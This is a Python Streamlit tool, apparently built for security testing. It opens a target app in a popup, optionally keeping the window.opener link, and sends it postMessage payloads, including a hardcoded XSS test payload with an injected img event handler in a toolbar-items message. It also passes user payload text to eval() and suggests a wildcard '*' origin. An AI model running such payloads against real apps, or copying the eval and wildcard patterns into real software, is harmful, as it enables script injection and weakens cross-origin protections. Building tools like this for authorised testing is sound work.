import streamlit as st
import streamlit.components.v1 as components
import json

st.set_page_config(page_title="Embedded Site Viewer", layout="wide")

st.title("Embedded Site Viewer")
st.caption("Embed an external site in an iframe.")

with st.sidebar:
    st.header("Iframe Settings")
    target_url = st.text_input("Target URL", value="", placeholder="https://example.com")
    height = st.slider("Iframe height", min_value=400, max_value=1400, value=800, step=50)
    scrolling = st.toggle("Enable scrolling", value=True)

    st.header("Popup Test")
    popup_url = st.text_input(
        "Popup URL",
        value=target_url or "https://target-app.com",
        placeholder="https://target-app.com",
    )

    # Security test controls
    keep_opener_link = st.toggle(
        "Keep opener link (disable noopener/noreferrer)",
        value=False,
        help="Enable only in controlled testing. This recreates the cross-window trust link.",
    )
    target_origin = st.text_input(
        "Expected target origin for postMessage",
        value="https://target-app.com",
        placeholder="https://target-app.com",
    )
    
    st.divider()
    
    with st.expander("🔧 Troubleshooting Guide"):
        st.markdown("""
        **Common Issues:**
        
        1. **Popup Blocked**: Browser may block popups
           - Check browser popup settings
           - User interaction required (hover over button)
        
        2. **CORS Errors**: Cross-origin restrictions
           - Use `*` as target origin for testing
           - Check target site CORS policy
        
        3. **No Messages Received**:
           - Verify target origin matches exactly
           - Check if target site sends messages
           - Use validation button to diagnose
        
        4. **Opener Reference Lost**:
           - Enable "Keep opener link" toggle
           - Note: Security risk in production
        """)
    
    st.divider()
    
    use_hardcoded = st.toggle(
        "Use hardcoded XSS test payload",
        value=False,
        help="Send pre-configured XSS test payload with <script> and onerror injection",
    )
    
    if use_hardcoded:
        message_payload = '{"stCommVersion":1,"type":"SET_TOOLBAR_ITEMS","items":[{"borderless":false,"label":"AAAHHHHAHHAHAHHA,"icon":"<img src=x onclick=alert(1)>","key":"xss_test"}]}'
    else:
        message_payload = st.text_area(
            "postMessage payload (JSON or JavaScript)",
            value='{"type":"ping","source":"streamlit-tester"}',
            height=120,
            help="Enter valid JSON or JavaScript expression. Examples:\n"
                 "- JSON: {\"type\":\"ping\"}\n"
                 "- JS with Array: {\"items\": Array(250).fill({\"label\":\"test\"})}"
        )

st.info(
    "Some websites cannot be embedded in an iframe because of security headers such as "
    "X-Frame-Options or Content-Security-Policy."
)

if not target_url:
    st.warning("Enter a target URL in the sidebar to render the iframe.")
else:
    if target_url.startswith(("http://", "https://")):
        components.iframe(target_url, height=height, scrolling=scrolling)
    else:
        st.error("Please enter a valid URL that starts with http:// or https://")

st.divider()
st.subheader("Validation & Diagnostics")
st.caption("Real-time validation of iframe, popup, and messaging capabilities.")

col1, col2, col3 = st.columns(3)
with col1:
    st.metric("Iframe Load", "Testing...", help="Whether the iframe loaded successfully")
with col2:
    st.metric("Popup Status", "Not Opened", help="Current popup window state")
with col3:
    st.metric("Messages", "0", help="Number of messages received")

with st.expander("🔍 Validation Tests", expanded=True):
    st.markdown("""
    **Active Tests:**
    - ✓ **Iframe Context Detection**: Verifies if running in iframe or standalone
    - ✓ **Popup Open/Close Tracking**: Real-time popup window state monitoring
    - ✓ **postMessage Send/Receive**: Validates cross-window messaging
    - ✓ **Cross-Origin Security**: Checks origin validation and CORS policy
    - ✓ **Opener Reference**: Verifies window.opener accessibility
    
    **How to Test:**
    1. Set your target URL and popup URL in the sidebar
    2. Configure security settings (opener link, target origin)
    3. Hover over "Open popup" button to launch popup
    4. Click "Send postMessage" to test messaging
    5. Click "Run Validation" to see comprehensive diagnostics
    
    **Expected Behaviors:**
    - Popup should open on hover (may require popup permission)
    - Messages should appear in the log with timestamps
    - Origin validation should pass if configured correctly
    - Opener reference should work if "Keep opener link" is enabled
    """)

    st.info("💡 Use the validation button in the test interface below to run all diagnostic checks.")

st.divider()
st.subheader("window.open() and postMessage Test")
st.caption("Use this to validate popup auth behavior and cross-window messaging controls.")

if popup_url.startswith(("http://", "https://")):
    popup_url_js = json.dumps(popup_url)
    target_origin_js = json.dumps(target_origin.strip())
    keep_opener_js = "true" if keep_opener_link else "false"
    payload_raw = json.dumps(message_payload)

    components.html(
        f"""
        <div style="font-family: sans-serif;">
          <div style="margin-bottom:1rem;padding:0.8rem;background:#e8f4fd;border-left:4px solid #1976d2;">
            <strong>Validation Status:</strong>
            <div style="margin-top:0.5rem;">
              <span id="iframe-status" style="margin-right:1rem;">🔄 Iframe: Checking...</span>
              <span id="popup-status" style="margin-right:1rem;">⚪ Popup: Not opened</span>
              <span id="message-count" style="margin-right:1rem;">📬 Messages: 0</span>
            </div>
          </div>
          
          <div style="display:flex;gap:0.5rem;flex-wrap:wrap;">
            <button id="open-btn" style="padding:0.5rem 0.8rem;cursor:pointer;background:#1976d2;color:white;border:none;border-radius:4px;">Open popup</button>
            <button id="send-btn" style="padding:0.5rem 0.8rem;cursor:pointer;background:#388e3c;color:white;border:none;border-radius:4px;">Send postMessage</button>
            <button id="validate-btn" style="padding:0.5rem 0.8rem;cursor:pointer;background:#f57c00;color:white;border:none;border-radius:4px;">Run Validation</button>
            <button id="clear-btn" style="padding:0.5rem 0.8rem;cursor:pointer;background:#d32f2f;color:white;border:none;border-radius:4px;">Clear Log</button>
          </div>
          
          <div id="status" style="margin-top:0.6rem;padding:0.5rem;background:#fff3cd;border:1px solid #ffc107;border-radius:4px;color:#856404;">Ready.</div>
          <pre id="log" style="margin-top:0.6rem;padding:0.6rem;background:#f7f7f7;border:1px solid #ddd;border-radius:4px;max-height:300px;overflow:auto;font-size:0.85rem;"></pre>
        </div>

        <script>
          const status = document.getElementById("status");
          const log = document.getElementById("log");
          const openBtn = document.getElementById("open-btn");
          const sendBtn = document.getElementById("send-btn");
          const validateBtn = document.getElementById("validate-btn");
          const clearBtn = document.getElementById("clear-btn");
          const iframeStatus = document.getElementById("iframe-status");
          const popupStatus = document.getElementById("popup-status");
          const messageCountEl = document.getElementById("message-count");

          const popupUrl = {popup_url_js};
          const expectedOrigin = {target_origin_js};
          const keepOpener = {keep_opener_js};
          const payloadStr = {payload_raw};
          
          // Try to evaluate as JavaScript expression first, then parse as JSON, then use as-is
          let payload;
          let payloadSource = "unknown";
          
          // First try: evaluate as JavaScript (handles Array.fill, object literals, etc.)
          try {{
            payload = eval('(' + payloadStr + ')');
            payloadSource = "JavaScript eval";
            console.log("Payload evaluated as JavaScript:", payload);
          }} catch (evalError) {{
            // Second try: parse as JSON
            try {{
              payload = JSON.parse(payloadStr);
              payloadSource = "JSON parse";
              console.log("Payload parsed as JSON:", payload);
            }} catch (jsonError) {{
              // Third fallback: use as raw string
              payload = payloadStr;
              payloadSource = "raw string";
              console.log("Payload used as raw string:", payload);
            }}
          }}

          let popupRef = null;
          let messageCount = 0;
          let lastMessageTime = null;

          function append(line, type = "info") {{
            const timestamp = new Date().toLocaleTimeString();
            const prefix = type === "success" ? "✓" : type === "error" ? "✗" : type === "warning" ? "⚠" : "ℹ";
            log.textContent += `[${{timestamp}}] ${{prefix}} ${{line}}\\n`;
            log.scrollTop = log.scrollHeight;
          }}

          function updateStatus(msg, type = "info") {{
            status.textContent = msg;
            status.style.background = type === "success" ? "#d4edda" : type === "error" ? "#f8d7da" : type === "warning" ? "#fff3cd" : "#d1ecf1";
            status.style.borderColor = type === "success" ? "#c3e6cb" : type === "error" ? "#f5c6cb" : type === "warning" ? "#ffc107" : "#bee5eb";
            status.style.color = type === "success" ? "#155724" : type === "error" ? "#721c24" : type === "warning" ? "#856404" : "#0c5460";
          }}

          function updatePopupStatus() {{
            if (popupRef && !popupRef.closed) {{
              popupStatus.textContent = "🟢 Popup: Open";
              popupStatus.style.color = "#2e7d32";
            }} else {{
              popupStatus.textContent = "🔴 Popup: Closed";
              popupStatus.style.color = "#c62828";
            }}
          }}

          function updateMessageCount() {{
            messageCountEl.textContent = `📬 Messages: ${{messageCount}}`;
            if (messageCount > 0) {{
              messageCountEl.style.color = "#2e7d32";
            }}
          }}

          // Check for parent iframe
          function validateIframeContext() {{
            if (window.self !== window.top) {{
              iframeStatus.textContent = "✓ Iframe: Running in iframe";
              iframeStatus.style.color = "#2e7d32";
              append("Running inside an iframe context", "success");
            }} else {{
              iframeStatus.textContent = "⚠ Iframe: Running standalone";
              iframeStatus.style.color = "#f57c00";
              append("Not running in iframe - this is the parent page", "warning");
            }}
          }}

          // Periodic popup status check
          setInterval(() => {{
            if (popupRef) {{
              updatePopupStatus();
            }}
          }}, 1000);

          // Message listener with validation
          window.addEventListener("message", (event) => {{
            messageCount++;
            updateMessageCount();
            lastMessageTime = Date.now();
            
            append(`Received message from origin: ${{event.origin}}`, "success");
            append(`Data: ${{JSON.stringify(event.data)}}`);
            
            // Validate origin
            if (expectedOrigin && event.origin !== expectedOrigin && expectedOrigin !== "*") {{
              append(`⚠ Origin mismatch! Expected: ${{expectedOrigin}}, Got: ${{event.origin}}`, "warning");
            }} else {{
              append("✓ Origin validation passed", "success");
            }}
            
            updateStatus("Message received successfully", "success");
          }});

          openBtn.addEventListener("mouseenter", () => {{
            if (!popupRef || popupRef.closed) {{
              try {{
                const features = keepOpener ? "" : "noopener,noreferrer";
                append(`Opening popup with URL: ${{popupUrl}}`);
                append(`Opener link enabled: ${{keepOpener}}`);
                append(`Features: ${{features || "default"}}`);
                
                popupRef = window.open(popupUrl, "_blank", features);
                
                if (popupRef) {{
                  updateStatus("Popup opened successfully", "success");
                  append("Popup opened successfully", "success");
                  updatePopupStatus();
                  
                  // Test opener reference
                  if (keepOpener) {{
                    try {{
                      if (popupRef.opener === window) {{
                        append("✓ Opener reference is maintained", "success");
                      }} else {{
                        append("✗ Opener reference check failed", "error");
                      }}
                    }} catch (e) {{
                      append(`Cannot verify opener (CORS): ${{e.message}}`, "warning");
                    }}
                  }} else {{
                    append("Opener reference disabled (noopener)", "info");
                  }}
                }} else {{
                  updateStatus("Popup blocked by browser", "error");
                  append("Popup blocked by browser", "error");
                }}
              }} catch (e) {{
                updateStatus(`Error opening popup: ${{e.message}}`, "error");
                append(`Error: ${{e.message}}`, "error");
              }}
            }} else {{
              append("Popup already open", "warning");
            }}
          }});

          sendBtn.addEventListener("click", () => {{
            if (!popupRef || popupRef.closed) {{
              updateStatus("No live popup reference", "error");
              append("No live popup reference. Open popup first.", "error");
              return;
            }}
            
            try {{
              const targetOrigin = expectedOrigin || "*";
              const payloadType = typeof payload === 'object' ? 'object' : typeof payload;
              
              append(`Sending postMessage to popup...`);
              append(`Target origin: ${{targetOrigin}}`);
              append(`Payload source: ${{payloadSource}}`);
              append(`Payload type: ${{payloadType}}`);
              
              // Show a preview of the payload (truncate if too long)
              const payloadPreview = JSON.stringify(payload);
              if (payloadPreview.length > 200) {{
                append(`Payload: ${{payloadPreview.substring(0, 200)}}... (truncated)`);
              }} else {{
                append(`Payload: ${{payloadPreview}}`);
              }}
              
              // Log array length if it's an items array
              if (payload && payload.items && Array.isArray(payload.items)) {{
                append(`Items array length: ${{payload.items.length}}`);
              }}
              
              popupRef.postMessage(payload, targetOrigin);
              
              updateStatus("postMessage sent successfully", "success");
              append("✓ postMessage sent successfully", "success");
              
              // Wait for response
              setTimeout(() => {{
                if (lastMessageTime && (Date.now() - lastMessageTime) < 2000) {{
                  append("✓ Response received from popup", "success");
                }} else {{
                  append("⚠ No response from popup within 2s", "warning");
                }}
              }}, 2000);
              
            }} catch (e) {{
              updateStatus(`Error sending message: ${{e.message}}`, "error");
              append(`Error sending postMessage: ${{e.message}}`, "error");
            }}
          }});

          validateBtn.addEventListener("click", () => {{
            append("\\n=== Running Validation Tests ===");
            
            // Test 1: Iframe context
            validateIframeContext();
            
            // Test 2: Popup state
            if (popupRef && !popupRef.closed) {{
              append("✓ Popup window is open and accessible", "success");
              
              // Test 3: Opener reference
              if (keepOpener) {{
                try {{
                  if (popupRef.opener === window) {{
                    append("✓ Opener reference is valid", "success");
                  }} else {{
                    append("✗ Opener reference is invalid", "error");
                  }}
                }} catch (e) {{
                  append(`Cannot verify opener (CORS): ${{e.message}}`, "warning");
                }}
              }} else {{
                append("ℹ Opener reference disabled (noopener)", "info");
              }}
            }} else {{
              append("✗ No popup window open", "error");
            }}
            
            // Test 4: Message capabilities
            append(`Messages received: ${{messageCount}}`);
            if (messageCount > 0) {{
              append("✓ postMessage communication working", "success");
            }} else {{
              append("⚠ No messages received yet", "warning");
            }}
            
            // Test 5: Configuration
            const payloadType = typeof payload === 'object' ? 'object' : typeof payload;
            append(`Expected origin: ${{expectedOrigin}}`);
            append(`Keep opener: ${{keepOpener}}`);
            append(`Popup URL: ${{popupUrl}}`);
            append(`Payload source: ${{payloadSource}}`);
            append(`Payload type: ${{payloadType}}`);
            
            if (payload && payload.items && Array.isArray(payload.items)) {{
              append(`Items array length: ${{payload.items.length}}`);
            }}
            
            append("=== Validation Complete ===\\n");
            updateStatus("Validation tests completed", "info");
          }});

          clearBtn.addEventListener("click", () => {{
            log.textContent = "";
            updateStatus("Log cleared", "info");
          }});

          // Initial validation
          setTimeout(() => {{
            validateIframeContext();
            updateStatus("Ready for testing", "info");
            append("System initialized. Hover over 'Open popup' button to start.");
            append(`Payload processing: ${{payloadSource}}`);
            
            // Warn if payload looks like JavaScript but wasn't evaluated
            if (payloadSource === "raw string" && payloadStr.includes("Array(")) {{
              append("⚠ Payload contains 'Array(' but wasn't evaluated as JavaScript", "warning");
            }}
          }}, 500);
        </script>
        """,
        height=550,
    )
else:
    st.error("Popup URL must start with http:// or https://")
